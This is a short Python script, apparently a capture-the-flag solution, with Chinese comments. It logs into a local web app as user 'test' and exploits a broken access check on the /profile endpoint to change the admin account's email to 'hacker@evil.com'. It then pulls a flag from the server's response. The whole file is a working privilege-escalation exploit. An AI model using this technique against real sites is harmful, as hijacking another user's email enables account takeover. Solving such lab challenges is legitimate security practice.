import requests

url = "http://127.0.0.1:8000"

# 1. 登录 test 用户
s = requests.Session()
login_data = {
    "username": "test",
    "password": "test"
}
s.post(url + "/login", data=login_data)

# 2. 越权修改 admin 邮箱
profile_data = {
    "email": "hacker@evil.com",
    "username": "admin"
}
r = s.post(url + "/profile", data=profile_data)

# 3. 提取 flag
import re
flag = re.search(r'Email updated successfully!(.*?)<', r.text)
if flag:
    print("Flag:", flag.group(1).strip())
else:
    print("Flag not found, response:", r.text)